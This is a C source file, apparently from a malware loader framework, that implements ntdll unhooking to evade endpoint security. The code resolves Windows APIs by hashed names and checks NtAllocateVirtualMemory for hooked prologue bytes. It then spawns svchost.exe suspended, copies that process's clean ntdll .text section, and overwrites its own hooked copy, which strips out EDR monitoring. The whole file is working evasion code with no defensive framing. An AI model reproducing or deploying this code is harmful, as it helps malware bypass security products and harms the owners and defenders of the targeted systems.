#include "../../../includes/core/core.h"
#include "../../../includes/evasion/methods/unhook-process.h"
#include "../../../includes/apis/apidefs.h"
#include "../../../includes/apis/apis.h"


BOOL evasion_unhook_ntdll_process_load_apis(void) {
    
    if (!g_ldr->apis->CreateProcessA)
        g_ldr->apis->CreateProcessA = (pCreateProcessA)GetProc(g_ldr->apis->modules.kernel32, HASHED_CREATEPROCESSA);
    if (!g_ldr->apis->VirtualProtect)
        g_ldr->apis->VirtualProtect = (pVirtualProtect)GetProc(g_ldr->apis->modules.kernel32, HASHED_VIRTUALPROTECT);
    if (!g_ldr->apis->ReadProcessMemory)
        g_ldr->apis->ReadProcessMemory = (pReadProcessMemory)GetProc(g_ldr->apis->modules.kernel32, HASHED_READPROCESSMEMORY);
    if (!g_ldr->apis->TerminateProcess)
        g_ldr->apis->TerminateProcess = (pTerminateProcess)GetProc(g_ldr->apis->modules.kernel32, HASHED_TERMINATEPROCESS);

    return (g_ldr->apis->CreateProcessA && g_ldr->apis->VirtualProtect &&
        g_ldr->apis->ReadProcessMemory && g_ldr->apis->TerminateProcess);
}

BOOL is_ntdll_hooked() {
    FARPROC addr = GetProc(g_ldr->apis->modules.ntdll, HASHED_NTALLOCATEVIRTUALMEMORY);
    BYTE clean[] = { 0x4C, 0x8B, 0xD1, 0xB8 };
    PBYTE func = (PBYTE)addr;

    for (int i = 0; i < sizeof(clean); i++) {
        if (func[i] != clean[i]) return TRUE;
    }
    return FALSE;
}

BOOL evasion_unhook_ntdll_process(void) {
    if (!is_ntdll_hooked()) return TRUE;
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };

    g_ldr->apis->CreateProcessA("C:\\Windows\\System32\\svchost.exe", NULL, NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);

    if (!pi.hProcess) return FALSE;

    PBYTE ntdll = (PBYTE)g_ldr->apis->modules.ntdll;
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)ntdll;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(ntdll + dos->e_lfanew);
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt);

    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (strcmp((char*)section[i].Name, ".text") == 0) {
            DBGA(".text matchs\n");
            DWORD textSize = section[i].Misc.VirtualSize;
            PBYTE textAddr = ntdll + section[i].VirtualAddress;

            PBYTE clean = (PBYTE)g_ldr->apis->LocalAlloc(LMEM_FIXED, textSize);
            if (!clean) break;

            SIZE_T bytesRead = 0;
            g_ldr->apis->ReadProcessMemory(pi.hProcess, textAddr, clean, textSize, &bytesRead);

            DWORD old = 0;
            g_ldr->apis->VirtualProtect(textAddr, textSize, PAGE_EXECUTE_READWRITE, &old);
            memcpy(textAddr, clean, textSize);
            g_ldr->apis->VirtualProtect(textAddr, textSize, old, &old);

            g_ldr->apis->LocalFree(clean);
            break;
        }
    }

    PAUSE("Notepad");
    
    g_ldr->apis->TerminateProcess(pi.hProcess, 0);
    g_ldr->apis->CloseHandle(pi.hProcess);
    g_ldr->apis->CloseHandle(pi.hThread);

    return TRUE;
}

